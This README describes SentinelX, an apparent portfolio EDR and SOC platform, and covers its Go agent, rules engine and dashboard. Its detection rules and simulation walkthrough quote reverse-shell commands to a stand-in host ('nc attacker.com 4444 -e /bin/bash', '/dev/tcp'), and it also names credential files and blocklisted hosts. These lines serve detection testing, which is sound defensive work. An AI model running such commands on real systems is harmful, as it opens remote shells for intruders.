# SentinelX: Cloud EDR + SOC Security Orchestration Platform

SentinelX is a complete, enterprise-grade Endpoint Detection and Response (EDR) and Security Operations Center (SOC) platform designed to monitor endpoint nodes and cloud systems, ingest high-volume system events, correlate them against advanced behavioral rules, and display glowing visual alerts on a state-of-the-art cybersecurity command center.

This platform showcases low-level system design (Go endpoint daemon), high-throughput REST APIs (Go, Gin, Postgres, GORM), real-time sliding-window rate tracking (Redis keys and Tx pipelines), static and stateful security correlation heuristics, threat intelligence cache lookup databases, and premium modern glassmorphic front-end interfaces (React, TypeScript, Tailwind CSS, Recharts).

---

## Systems Architecture

```
                       [ Monitored Fleet Endpoints ]
       ┌───────────────────────┐               ┌───────────────────────┐
       │   SentinelX Go Agent  │               │   SentinelX Go Agent  │
       │   (Production Linux)  │               │ (Simulated Cross-OS)  │
       └───────────┬───────────┘               └───────────┬───────────┘
                   │                                       │
                   └─────────────────┬─────────────────────┘
                                     │ HTTPS
                                     ▼
                          ┌─────────────────────┐
                          │ Gin Go API Server   │
                          └──────────┬──────────┘
                                     │
           ┌─────────────────────────┼─────────────────────────┐
           ▼                         ▼                         ▼
 ┌───────────────────┐     ┌───────────────────┐     ┌───────────────────┐
 │  PostgreSQL DB    │     │    Redis Cache    │     │  Detection Engine │
 │  - Registered node│     │  - Stateful rate  │     │  - Static rules   │
 │  - Security alerts│     │    limits counters│     │  - C2 blocklists  │
 │  - Threat feeds   │     │    (SSH logins)   │     │  - File watchdogs │
 └───────────────────┘     └───────────────────┘     └───────────────────┘
                                     ▲
                                     │ REST / REST-Poll
                                     │
                           ┌─────────┴─────────┐
                           │  SOC Dashboard    │
                           │  React + TS + TW  │
                           └───────────────────┘
```

---

## Technology Stack

* **Endpoint Agent**: Go (telemetry scanning, cross-compiled, signal interrupt hooks).
* **SOC Server Backend**: Go, Gin Web Framework, GORM ORM, PostgreSQL (Alert logs & Host databases), Redis (sliding-window state cache).
* **SOC Console UI**: React, TypeScript, Tailwind CSS, Lucide Icons, Recharts (Area charts).
* **Deployment & IaC**: Docker, Docker Compose, Terraform (AWS ECS & Azure VM configurations).

---

## Core Features & Threat Detection Rules

1. **Behavioral Reverse Shell Rule (Critical)**:
   * Heuristic matches command patterns like `nc attacker.com 4444 -e /bin/bash`, `bash -i >& /dev/tcp/...`, and Python pty allocations.
2. **Stateful SSH Brute Force Rule (Medium)**:
   * Tracks login failure rates using sliding-window TTL counters inside Redis (keyed by host + source IP). Triggers security events exactly upon 5 failed logins within 1 minute.
3. **Threat Intelligence Blocklist Engine (Critical)**:
   * Matches outbound agent network sockets against cached Feodo Tracker, Spamhaus, and Emerging Threats feeds. Seeds known bad targets (e.g. `185.230.125.1` and `evil-botnet.ru`).
4. **Administrative Heuristics (High)**:
   * Flags suspicious user additions (`useradd hacker`), privilege changes, or modification of highly sensitive credentials files (`/etc/passwd`, `/etc/shadow`).
5. **System Cron Persistence watchdog (Low)**:
   * Detects cron configurations write attempts (`/var/spool/cron/*` or `/etc/cron*`) used for maintaining silent persistent system control.

---

## Quick Start Setup (Docker Compose Orchestrated)

Run the entire environment (Postgres database, Redis cache, Server, Dashboard, and two concurrently reporting Go Endpoint Agents) in a single command:

```bash
# Navigate to deployment directory
cd deploy

# Build and orchestrate all containers in the background
docker-compose up -d --build
```

### Port Mappings:
* **SOC Dashboard Console**: [http://localhost:3000](http://localhost:3000)
* **SOC Backend REST API**: [http://localhost:8080](http://localhost:8080)
* **PostgreSQL Engine**: `localhost:5432` (user/password: `postgres`/`postgres`)
* **Redis Store**: `localhost:6379`

---

## Quick Start Setup (Local Manual Execution)

If running without Docker, initialize databases and processes manually:

### 1. Backend Server Setup:
```bash
cd server
export DATABASE_URL="host=localhost user=postgres password=postgres dbname=sentinelx port=5432 sslmode=disable"
export REDIS_URL="localhost:6379"
export PORT="8080"
go run .
```

### 2. Low-Level Agent Setup:
```bash
cd agent
export SENTINELX_API_URL="http://localhost:8080"
export SENTINELX_HOST_ID="localhost-host"
export SENTINELX_HOSTNAME="ubuntu-server-prod"
export SENTINELX_OS="linux"
export SENTINELX_MOCK_MODE="true" # Set false on native Linux with root permissions
go run .
```

### 3. React Dashboard Setup:
```bash
cd dashboard
npm install
npm run dev
```
Access dashboard console on [http://localhost:3000](http://localhost:3000).

---

## Simulating Security Threats (Walkthrough)

To verify the EDR capabilities, trigger simulated alerts via the agent or REST payload injects:

### A. Reverse Shell Event (Critical Alert)
1. Run the agent in simulated mode.
2. In the background cycle, the agent spawns `nc attacker.com 4444 -e /bin/bash`.
3. An alarm immediately lights up on the **SOC Dashboard**: **[CRITICAL] Reverse Shell Detected** on `prod-web-01`.

### B. SSH Brute Force (Medium Alert)
1. The agent periodically fires a burst of 5 failed authentication logs targeting `root` from a mock malicious IP (e.g. `45.80.201.12`).
2. Redis tracks the failures. On the 5th tick, a **[MEDIUM] SSH Brute Force Attempt** alarm fires on the dashboard timeline with the source IP info.

### C. Threat Intelligence Connection (Critical Alert)
1. The agent reports an outbound network socket request targeting `185.230.125.1` (linked to Feodo Tracker C2 botnets).
2. The server queries GORM, matches the seeded threat intelligence blocklist record, and triggers a **[CRITICAL] Threat Intelligence Match (IP)** alarm.

---

## Granular Git Commit History

The repository has been structured using industry standard incremental commits to showcase transparent, logical development history:

* `ebd5f9d`: `feat(agent): implement Go telemetry agent with dual linux/demo modes`
* `f03e4de`: `feat(server): build Go API Server database connection and models`
* `d838f33`: `feat(detection): integrate Redis and develop rules correlation engine`
* `3a2ac68`: `feat(intel): build Threat Intelligence blocklist check engine`
* `b629975`: `feat(dashboard): initialize React + Tailwind CSS SOC Dashboard base theme`
* `4447e95`: `feat(dashboard): design real-time SOC metrics and active Hosts panel`
* `fdbe70a`: `feat(dashboard): build detailed Alerts list and interactive Timeline`
* `68e4ea7`: `feat(deploy): write Dockerfiles and compose configs for orchestrating`
* `README.md`: Comprehensive recruiter portfolio documentation.
